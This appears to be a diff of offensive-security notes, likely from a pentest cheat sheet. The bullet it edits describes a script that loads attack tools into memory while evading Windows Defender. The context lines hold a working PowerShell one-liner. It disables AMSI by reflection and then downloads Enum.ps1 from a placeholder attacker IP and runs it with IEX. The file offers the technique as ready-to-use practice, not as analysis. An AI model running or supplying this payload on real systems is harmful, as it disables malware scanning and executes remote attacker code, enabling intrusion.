@@ -9,8 +9,7 @@
 
 # As a good practice
 * Create a powershell script which will bypass AMSI, load tools and run them in momory 'bypassing Defender'
-* I have created Enum.ps1 which will download all the tools and run them in memory 'Put your IP'
-* Use the bellow oneliner to bypass AMSI, download Enum,ps1 and run in in memory:
+* I have created Enum.ps1 which will download all the tools and run them 'Put your IP'. You can use the bellow oneliner to bypass AMSI, download Enum.ps1 and run the comands in memory:
 * Option 1)
 $a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Failed") {$f = $e}};$f.SetValue($null,$true); (new-object system.net.webclient).downloadstring('http://<Your IP>/Enum.ps1') | IEX
 * Option 2)
